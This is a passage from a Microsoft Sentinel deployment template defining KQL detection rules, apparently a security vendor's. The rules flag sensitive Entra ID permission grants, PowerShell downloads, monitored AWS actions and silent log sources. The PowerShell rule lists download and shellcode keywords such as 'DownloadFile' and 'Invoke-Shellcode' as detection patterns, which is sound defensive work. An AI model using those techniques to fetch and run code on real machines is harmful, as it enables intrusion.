            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-21096: [RBA] Change - OfficeActivity - Teams Activity {{bv_vendor_action1}} By {{bv_user}}",
            "alertDescriptionFormat": "This detection identifies when a Microsoft Teams chat or meeting is created by a user who has shown no prior activity in the environment within the last 14 days. Such behavior may indicate account takeover, insider threat activity, or an attacker leveraging compromised credentials to establish communication channels for data exfiltration or command and control.\n\n{{bv_desc_l}}\n\ntag: RBA\nCategory: BVIM\ncim_models: change\nMITRE: T1078 MITRE: T1136 MITRE: T1534 MITRE: T1098 MITRE: T1199"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1980')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1980')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1980: [RBA] AzureAD - Sensitive Permissions Granted",
          "description": "Generates an event when a sensitive permissions are added. MITRE: T1098 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 10m;\nlet alert_bin = 1h;\nlet alert_type = 'RBA';\nlet alert_id = 'BV-1980:';\nlet start_time_suppress = 1d;\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}])\n, 'excluded_dedup_hash_fields': dynamic(['bv_object_attr'])\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1980_CONFIG['RBASCORE']),2.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1980_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_start_time']));\nlet excluded_description_fields = dynamic(['']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);       \nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nAuditLogs\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n|where TargetResources contains 'readwrite.all' and Result == 'success' and AADOperationType == 'Assign'\n| extend\n    TargetResourceAppId = tostring(TargetResources[0].id)\n    ,TargetResourceAppName = tostring(TargetResources[0].displayName)\n    ,   modifiedProperties = TargetResources[0].modifiedProperties\n    ,InitiatedByUser = tolower(tostring(InitiatedBy.user.userPrincipalName))\n    ,InitiatedByAppId = tostring(InitiatedBy.app.servicePrincipalId)\n    ,InitiatedByAppName = tostring(InitiatedBy.app.displayName)\n    , bv_src_ip = tostring(InitiatedBy.user.ipAddress)\n  |mv-expand modifiedProperties\n  |project-reorder TimeGenerated, modifiedProperties\n  |parse modifiedProperties with * 'displayName\":\"' field_name '\"' *\n  |parse modifiedProperties with * 'newValue\":\"' field_value \n  |parse field_value with * 'Scope: ' groups_added ', Crea' *\n  |project-reorder CorrelationId, TimeGenerated, field_name, field_value, groups_added\n  |where field_name contains 'consentaction.permissions'\n  |extend bv_dest_app = TargetResourceAppName\n      , bv_dest_app_id = TargetResourceAppId\n      , bv_user = InitiatedByUser\n      , bv_src_user = InitiatedByUser\n      , bv_src_app = InitiatedByAppName\n      , bv_src_app_id = InitiatedByAppId\n      , bv_vendor_action = OperationName\n      , bv_change_action = 'modify'\n      , bv_object_attr = groups_added\n      , bv_start_time = TimeGenerated\n      , bv_alert_id = CorrelationId\n      |parse AdditionalDetails with * 'User-Agent\",\"value\":\"' bv_http_user_agent '\"' *\n  |project-reorder bv_start_time, bv_*\n        | extend bv_alarm_victim_entities = pack_array(bv_dest_app), bv_alarm_attacker_entities = pack_array(bv_user)\n                , bv_dedup_hash = hash_sha1(tolower(bv_alert_id))\n        | invoke match(exclusions, 'exclusion')\n        | extend excluded = iff((visibility contains '0'), true, false)\n        | where excluded == false\n        | invoke description(excluded_description_fields)\n        | where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n        | extend bv_alarm_rba_score =  BV_FUN_CALC_RBA(alert_id,visibility,rba_score)              \n        |project-reorder bv_*",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT25M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1980: [RBA] AzureAD - Sensitive Permissions Granted by {{bv_user}}",
            "alertDescriptionFormat": "Generates an event when sensitive permissions are granted.\n\n{{ExtendedDescription}}\n\nMITRE: T1098\nCategory: Azure AD\ntag: RBA"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-999997')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-999997')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-999997: [SOC] Delegated Notifications",
          "description": "Any RBA Rule IDs listed in BV999997_DELEGATED_ALERTS will be transformed into an Incident that can then be used for investigation by the SOC MITRE:  Category: SecurityAlert tag: SOC",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 7m;\nlet latency = 30m;\nlet end_time = now();\nlet start_time_historical=1h;\nlet PreviousAlertIds = toscalar(\n  SecurityAlert\n  //| where SystemAlertId in (PreviousSecurityIncidents)\n  | extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).DelegatedAlertID))[0])\n  |summarize make_set(OriginalAlertID)\n);\nSecurityAlert\n| where TimeGenerated between (ago(start_time + latency) .. end_time)\n| where AlertName contains 'BV-'\n| parse AlertName with RuleID ':' *\n| where AlertName !contains 'Custom'\n| where AlertName !contains '[SOC]'\n| where Description !contains '[Delegated Notification]'\n| extend signature = trim(@'\\s', extract(@'(?m)bv_signature:(.*)$', 1, Description))\n| where RuleID in (BV999997_DELEGATED_ALERTS) or strcat(RuleID,'|', signature) in~ (BV999997_DELEGATED_ALERTS)      \n| where SystemAlertId !in (PreviousAlertIds)\n| parse AlertName with * ']' Title\n| project\n    Title\n    , RuleID\n    , Description\n    , AlertSeverity\n    , Tactics\n    , SystemAlertId\n    , Entities",
          "queryFrequency": "PT7M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{RuleID}}: [SOC] {{Title}}",
            "alertDescriptionFormat": "[Delegated Notification from 'BV-999997:]\n\n{{Description}}",
            "alertTacticsColumnName": "Tactics",
            "alertSeverityColumnName": "AlertSeverity"
          },
          "customDetails": {
            "DelegatedAlertID": "SystemAlertId"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": [
            {
              "columnName": "Entities"
            }
          ],
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10520')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10520')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10520: [Custom] Windows - Powershell Downloads",
          "description": "Generates an event when a download is identified in Powershell MITRE: T1071 Category: Windows Security Events tag: Custom",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic([4688]);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;         \nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where isnotempty(CommandLine)\n| project \n    bv_process_command_line = CommandLine\n    , bv_process = NewProcessName\n    , bv_parent_process = ParentProcessName\n    , bv_file_name = Process\n    , bv_start_time = TimeGenerated\n    , bv_user = SubjectUserName\n    , bv_src_dvc_hostname = Computer\n| where bv_file_name in~ (\"powershell.exe\", \"powershell_ise.exe\", \"pwsh.exe\")\n| where bv_process_command_line has_any ('Net.WebClient', 'DownloadFile', 'Invoke-WebRequest', 'Invoke-Shellcode', 'http:', 'https:')\n| where not(bv_parent_process matches regex @\"^[A-Z]:\\\\(?:SMS_CCM|Program Files\\\\SMS_CCM|Windows\\\\CCM)\\\\CcmExec\\.exe$\" and bv_process_command_line matches regex @\"^\"\"C:\\\\(Windows|WINDOWS|windows)\\\\system32\\\\WindowsPowerShell\\\\v1\\.0\\\\PowerShell\\.exe\"\" -Nologo -Noninteractive -NoProfile -ExecutionPolicy Bypass; Get-DeliveryOptimizationStatus \\| where-object \\{\\(\\$_\\.Sourceurl -CLike 'https?://localhost:\\d+\\*'\\) -AND \\(\\(\\$_\\.FileSize -ge '\\d+'\\) -or \\(\\$_\\.BytesFromPeers -ne '0'\\) -or \\(\\(\\$_\\.BytesFromCacheServer -ne '0'\\) -and \\(\\$_\\.BytesFromCacheServer -ne \\$null\\)\\)\\)\\} \\| select-object -Property BytesFromHttp, FileId, BytesFromPeers,Status,BytesFromCacheServer,SourceURL \\| ConvertTo-Xml -as string -NoTypeInformation$\")\n| mv-apply e = BV10520_EXCLUSIONS on (\n                extend key_count = array_length(bag_keys(e))\n                | extend bv_file_name_excluded = iff(bv_file_name contains e.bv_file_name, true, false)\n                | extend bv_parent_process_excluded = iff(bv_parent_process contains e.bv_parent_process, true, false)\n                | extend bv_src_dvc_hostname_excluded = iff(bv_src_dvc_hostname contains e.bv_src_dvc_hostname, true,false)\n                | extend bv_process_command_line_excluded = iff(bv_process_command_line contains e.bv_process_command_line, true,false)\n                | extend bv_user_excluded = iff(bv_user contains e.bv_user, true,false)\n                | extend excluded_count = \n                        iff(bv_file_name_excluded and isnotempty(e.bv_file_name), 1,0)\n                        + iff(bv_src_dvc_hostname_excluded and isnotempty(e.bv_src_dvc_hostname), 1,0)\n                        + iff(bv_process_command_line_excluded and isnotempty(e.bv_process_command_line), 1,0)\n                        + iff(bv_parent_process_excluded and isnotempty(e.bv_parent_process) , 1,0)\n                        + iff(bv_user_excluded and isnotempty(e.bv_user_excluded) , 1,0)\n                | extend excluded = iff(excluded_count == key_count and key_count != 0, true, false)\n                | summarize excluded=make_set(excluded)\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false\n| extend AttackerEntity = pack_array(bv_user, bv_src_dvc_hostname)\n| extend ExtendedDescription = strcat(\n            'bv_src_dvc_hostname: ', bv_src_dvc_hostname\n            ,'\\nbv_file_name: ', bv_file_name\n            ,'\\nbv_user: ', bv_user\n            ,'\\nbv_process_command_line: ', bv_process_command_line\n            ,'\\nbv_parent_process: ', bv_parent_process\n        )\n| project \n    bv_start_time\n    , bv_file_name\n    , bv_user\n    , bv_src_dvc_hostname\n    , bv_process_command_line\n    , bv_parent_process\n    , AttackerEntity\n    , ExtendedDescription\n    , RBAScore = 2",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an event when a download is identified in Powershell\n\n{{ExtendedDescription}}\n\nMITRE: T1071\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc_hostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11410')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11410')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11410: [RBA] AWS - Monitored Action Detected",
          "description": "Alerts when there is a monitored action from specific a source is detected MITRE: T1566 Category: AwsS3 by BlueVoyant tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let lookback_period = 1d;\nlet start_time_historical = 1d;\nlet detection_period = 1h; \nlet start_time = 15m;\nlet latency = 5m;\nlet end_time = now();\nlet start_time_suppress = 1d;\nlet alert_type = 'RBA';\nlet alert_id = 'BV-11410:';\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}])\n, 'excluded_dedup_hash_fields': dynamic(['bv_object_attr'])\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11410_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11410_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_start_time']));\nlet excluded_description_fields = dynamic(['']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);       \nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nAWSCloudTrail\n|where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n|where EventSource in (BV11410_EVENTSOURCES)\n| where EventName in (BV11410_EVENTNAMES)\n|where strlen(ErrorCode) < 1\n| extend User1 = iif(isnotempty(UserIdentityUserName), UserIdentityUserName, SessionIssuerUserName)\n| parse UserIdentityPrincipalid with * ':' User2\n|parse UserIdentityArn with * '/' User3\n| extend bv_user = coalesce( User2, SessionIssuerUserName, User3, User1)\n|extend bv_src_ip = iif (ipv6_is_in_any_range(SourceIpAddress, dynamic(['0.0.0.0/0'])) == true, SourceIpAddress, '')\n|extend bv_src_dvc = iif (ipv6_is_in_any_range(SourceIpAddress, dynamic(['0.0.0.0/0'])) == true, '', SourceIpAddress)\n|extend bv_object_attr = tostring(ResponseElements)\n  , bv_vendor_action = EventName\n  , bv_object = EventSource\n  , bv_alarm_attacker_entities = pack_array(bv_user, bv_src_ip)\n  , bv_start_time = TimeGenerated\n| invoke match(exclusions, 'exclusion')\n    | extend excluded = iff((visibility contains '0'), true, false)\n    | where excluded == false\n    | invoke description()\n      |extend bv_dedup_hash = hash_sha1(tolower(tostring(bv_user)))\n    | where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n    | extend bv_alarm_rba_score =  BV_FUN_CALC_RBA(alert_id,visibility,rba_score)\n    | extend ExtendedDescription = strcat('User account ', bv_user, ' performed action ', bv_vendor_action, ' on ', bv_object_attr)\n    |project-reorder bv_start_time, bv_* , ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11410: [RBA] - AWS - Monitored AWS Action Performed by {{bv_user}}",
            "alertDescriptionFormat": "Alerts when a monitored AWS action is performed\n\n{{ExtendedDescription}}\n\ntag: RBA\nMITRE: T1566"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9045')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9045')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9045: [Health] Sentinel Usage - Silent CL table - An external datasource has not been seen in the past 30 Hours",
          "description": "This alert identifies when logs have not been seen in the past 30 hours for one or more tables as detailed in the results. MITRE:  Category: BV Connector,Health tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let MonitoredTables = dynamic([\n\"ABNORMAL_CASES_CL\"\n, \"ABNORMAL_THREAT_MESSAGES_CL\"\n, \"accessLog_CL\"\n, \"afi_proofpoint_testmh_message_CL\"\n, \"afi_proofpoint_testmh_msgparts_CL\"\n, \"afi_proofpoint_testmh_urls_CL\"\n, \"afi_vSphere_CL\"\n, \"AkeylessAudit_CL\"\n, \"Aqua_CL\"\n, \"Audit_CL\"\n, \"Audit_CL\"\n, \"AuditLogs_CL\"\n, \"auth0_CL\"\n, \"AvananSecurityEvents_CL\"\n, \"AWS_WAF_CL\"\n, \"AwsCloudWatchAwsVpn_CL\"\n, \"AwsCloudWatchRoute53_CL\"\n, \"BIND_CL\"\n, \"BV_ADX_Health_CL\"\n, \"BV_Cato_CL\"\n, \"BV_CylanceDetections_CL\"\n, \"BV_CylanceMemoryProtection_CL\"\n, \"BV_CylanceThreats_CL\"\n, \"BV_FireEyeHX_Alerts_CL\"\n, \"BV_FireEyeHX_Hosts_CL\"\n, \"BV_GeolocatedIPs_CL\"\n, \"BV_GeolocatedIPs_CL\"\n, \"BV_SentinelOne_CL\"\n, \"BV_SophosCentral_Alerts_CL\"\n, \"BV_SophosCentral_Events_CL\"\n, \"BV_Summary_Index_CL\"\n, \"BV_SymantecCloudSWG_CL\"\n, \"BV_Workday_CL\"\n, \"BV_WorkdaySignons_CL\"\n, \"CarbonBlackAlerts_CL\"\n, \"CarbonBlackNotifications_CL\"\n, \"Central1_CL\"\n, \"Cisco_Umbrella_dns_CL\"\n, \"Cisco_Umbrella_proxy_CL\"\n, \"CiscoDuo_CL\"\n, \"CiscoSecureEndpoint_CL\"\n, \"CitrixAnalytics_indicatorSummary_CL\"\n, \"CitrixAnalytics_indicatorSummary_CL\"\n, \"client_portal_login_events_CL\"\n, \"CloudFlare_CL\"\n, \"Cloudflare_CL\"\n, \"Cloudflare_CL\"\n, \"CloudflareFirewall_CL\"\n, 